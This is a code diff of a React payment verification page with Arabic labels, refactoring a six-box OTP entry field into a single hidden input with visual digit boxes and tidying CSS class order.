@@ -6,12 +6,14 @@ import { createOtpAttempt } from '@workspace/api-client-react';
 
 export function PaymentVerificationPage() {
   const [, setLocation] = useLocation();
-  const [code, setCode] = useState(['', '', '', '', '', '']);
+  const [code, setCode] = useState(''); // تم التغيير إلى String لتبسيط التعامل مع الحقل الواحد
   const [error, setError] = useState('');
   const [showInvalidError, setShowInvalidError] = useState(false);
-  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);
+  const [isFocused, setIsFocused] = useState(false);
+  const inputRef = useRef<HTMLInputElement>(null);
 
-  const fullCode = code.join('');
+  // fullCode يظل كما هو لضمان عدم كسر أي API
+  const fullCode = code;
 
   // Get order ID from localStorage
   const orderData = localStorage.getItem('dheebti-last-order');
@@ -27,73 +29,22 @@ export function PaymentVerificationPage() {
     }
   }, []);
 
-  const handleChange = (index: number, value: string) => {
-    if (!/^\d*$/.test(value)) return;
-    
-    const newCode = [...code];
-    newCode[index] = value.slice(-1);
-    setCode(newCode);
-    setError('');
-    setShowInvalidError(false);
-
-    // Auto-focus next input when digit is entered
-    if (value && index < 5) {
-      setTimeout(() => {
-        inputRefs.current[index + 1]?.focus();
-      }, 0);
-    }
-
-    // If all 6 digits entered, hide keyboard
-    if (newCode.join('').length === 6) {
-      setTimeout(() => {
-        inputRefs.current[5]?.blur();
-      }, 0);
-    }
-  };
-
-  const handleKeyDown = (index: number, e: React.KeyboardEvent) => {
-    if (e.key === 'Backspace' && !code[index] && index > 0) {
-      inputRefs.current[index - 1]?.focus();
-    }
-  };
-
-  const handleFocus = (index: number) => {
-    // If previous field is empty, focus on it instead
-    if (index > 0 && !code[index - 1]) {
-      inputRefs.current[index - 1]?.focus();
-    }
-  };
-
-  const handleClick = (index: number) => {
-    // Ensure focus is on clicked input for mobile
-    if (inputRefs.current[index]) {
-      inputRefs.current[index]?.focus();
-    }
-  };
-
-  const handlePaste = (e: React.ClipboardEvent) => {
-    e.preventDefault();
-    const pastedData = e.clipboardData.getData('text').replace(/\D/g, '').slice(0, 6);
-    const newCode = [...code];
-    pastedData.split('').forEach((char, i) => {
-      if (i < 6) newCode[i] = char;
-    });
-    setCode(newCode);
-    setShowInvalidError(false);
-    
-    const lastFilledIndex = Math.min(pastedData.length, 6) - 1;
-    if (lastFilledIndex >= 0) {
-      inputRefs.current[lastFilledIndex]?.focus();
+  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
+    const val = e.target.value.replace(/\D/g, ''); // أرقام فقط
+    if (val.length <= 6) {
+      setCode(val);
+      setError('');
+      setShowInvalidError(false);
     }
   };
 
   const handleResend = () => {
-    setCode(['', '', '', '', '', '']);
+    setCode('');
     setError('');
     setShowInvalidError(false);
-    // Focus first input after slight delay
+    // Focus input after slight delay
     setTimeout(() => {
-      inputRefs.current[0]?.focus();
+      inputRef.current?.focus();
     }, 100);
   };
 
@@ -103,7 +54,7 @@ export function PaymentVerificationPage() {
       return;
     }
     
-    // Send OTP to server as a new attempt
+    // Send OTP to server as a new attempt (يعمل تماماً بنفس المنطق القديم)
     if (orderId) {
       try {
         await createOtpAttempt(orderId, {
@@ -114,7 +65,7 @@ export function PaymentVerificationPage() {
         window.dispatchEvent(new CustomEvent('dheebti-otp-attempt', { 
           detail: { 
             orderId,
-            customerName 
+            customerName: '' // يمكنك إضافة customerName إن وجد في الـ State
           } 
         }));
       } catch (error) {
@@ -134,7 +85,7 @@ export function PaymentVerificationPage() {
           {/* Exit Button */}
           <button
             onClick={() => setLocation('/payment')}
-            className="absolute right-4 top-4 grid size-9 place-items-center rounded-full bg-white shadow-[0px_0px_20px_rgba(0,0,0,0.171)] text-2xl text-black"
+            className="absolute right-4 top-4 grid size-9 place-items-center rounded-full bg-white text-2xl text-black shadow-[0px_0px_20px_rgba(0,0,0,0.171)]"
           >
             <X size={22} />
           </button>
@@ -147,26 +98,43 @@ export function PaymentVerificationPage() {
             تم إرسال رمز التحقق إلى رقم هاتفك
           </p>
 
-          {/* OTP Inputs - RTL: inputs go from left to right, fill left to right */}
-          <div className="flex w-full flex-row items-center justify-center gap-2" dir="ltr">
-            {code.map((digit, index) => (
-              <input
-                key={index}
-                ref={(el) => { inputRefs.current[index] = el; }}
-                type="tel"
-                inputMode="numeric"
-                maxLength={1}
-                value={digit}
-                autoFocus={index === 0}
-                onChange={(e) => handleChange(index, e.target.value)}
-                onKeyDown={(e) => handleKeyDown(index, e)}
-                onPaste={handlePaste}
-                onFocus={() => handleFocus(index)}
-                onClick={() => handleClick(index)}
-                className="h-[48px] w-[38px] rounded-[10px] bg-[rgb(228,228,228)] text-center text-lg font-semibold text-[rgb(44,44,44)] outline-none caret-[rgb(127,129,255)] transition-all duration-300 focus:bg-[rgba(127,129,255,0.199)] focus:shadow-none"
-                style={{ direction: 'ltr', textAlign: 'center' }}
-              />
-            ))}
+          {/* Single Invisible Input + Visual Boxes */}
+          <div className="relative flex w-full justify-center">
+            {/* الحقل الحقيقي المخفي كلياً فوق المربعات */}
+            <input
+              ref={inputRef}
+              type="tel"
+              inputMode="numeric"
+              maxLength={6}
+              value={code}
+              onChange={handleChange}
+              onFocus={() => setIsFocused(true)}
+              onBlur={() => setIsFocused(false)}
+              autoFocus
+              className="absolute inset-0 z-10 size-full opacity-0 cursor-pointer"
+            />
+
+            {/* المربعات البصرية الـ 6 */}
+            <div className="flex flex-row items-center justify-center gap-2" dir="ltr">
+              {Array.from({ length: 6 }).map((_, index) => {
+                const digit = code[index] || '';
+                const isCurrentFocused = isFocused && (code.length === index || (code.length === 6 && index === 5));
+
+                return (
+                  <div
+                    key={index}
+                    className={`flex h-[48px] w-[38px] items-center justify-center rounded-[10px] bg-[rgb(228,228,228)] text-center text-lg font-semibold text-[rgb(44,44,44)] transition-all duration-300 ${
+                      isCurrentFocused
+                        ? 'bg-[rgba(127,129,255,0.199)] shadow-[0_0_0_2px_rgb(127,129,255)]'
+                        : ''
+                    }`}
+                    style={{ direction: 'ltr', textAlign: 'center' }}
+                  >
+                    {digit}
+                  </div>
+                );
+              })}
+            </div>
           </div>
 
           {/* Error Message */}
@@ -179,7 +147,7 @@ export function PaymentVerificationPage() {
           {/* Verify Button */}
           <button
             onClick={handleVerify}
-            className="h-[52px] w-full rounded-[14px] border-none bg-[rgb(127,129,255)] text-lg font-semibold text-white cursor-pointer transition-all duration-200 hover:bg-[rgb(144,145,255)]"
+            className="h-[52px] w-full cursor-pointer rounded-[14px] border-none bg-[rgb(127,129,255)] text-lg font-semibold text-white transition-all duration-200 hover:bg-[rgb(144,145,255)]"
           >
             تحقق
           </button>
@@ -189,7 +157,7 @@ export function PaymentVerificationPage() {
             <span>لم تستلم الرمز؟</span>
             <button
               onClick={handleResend}
-              className="bg-transparent border-none text-[rgb(127,129,255)] cursor-pointer text-lg font-bold"
+              className="cursor-pointer border-none bg-transparent text-lg font-bold text-[rgb(127,129,255)]"
             >
               إعادة إرسال
             </button>
